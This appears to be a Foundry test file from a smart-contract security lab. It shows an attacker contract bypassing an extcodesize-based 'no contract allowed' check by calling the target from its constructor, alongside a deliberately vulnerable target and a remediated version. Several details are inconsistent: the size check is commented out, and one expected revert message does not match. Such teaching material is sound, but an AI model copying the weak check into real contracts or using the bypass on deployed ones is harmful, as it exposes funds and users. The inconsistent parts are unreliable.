pragma solidity ^0.8.19;

import "forge-std/Test.sol";

contract ContrastTest is Test {
    Target target;
    FailedAttack failedAttak;
    Attack AttackerContract;
    TargetRemediated targetRemediatedContract;

constructor() {
        target = new Target();
        failedAttak = new FailedAttack();
        targetRemediatedContract = new TargetRemediated();
    }

    function testBypassFailedContractCheck() public {
        console.log(
            "Before exploiting, protected status of target:",
            target.pwned()
        );
        console.log("Exploit Failed");
        failedAttak.pwn(address(target));
    }

    function testBypassContractCheck() public {
        console.log(
            "Before exploiting, protected status of target:",
            target.pwned()
        );
        AttackerContract = new Attack(address(target));
        console.log(
            "After exploiting, protected status of target:",
            target.pwned()
        );
        console.log("Exploit completed");
    }

    receive() external payable {}
}

contract Target {
    function isContract(address account) public view returns (bool) {
        uint size;
        // assembly {
        //     size := extcodesize(account);
        // }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "No contract allowed");
        pwned = true;
    }
}
contract FailedAttack is Test {
    function pwn(address _target) external {
        vm.expectRevert("no contract allowed");
        Target(_target).protected();
    }
}

contract Attack {
    bool public isContract;
    address public addr;

    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        Target(_target).protected();
    }
}

contract TargetRemediated {
    function isContract(address account) public view returns (bool) {
        require(tx.origin == msg.sender);
        return account.code.length > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}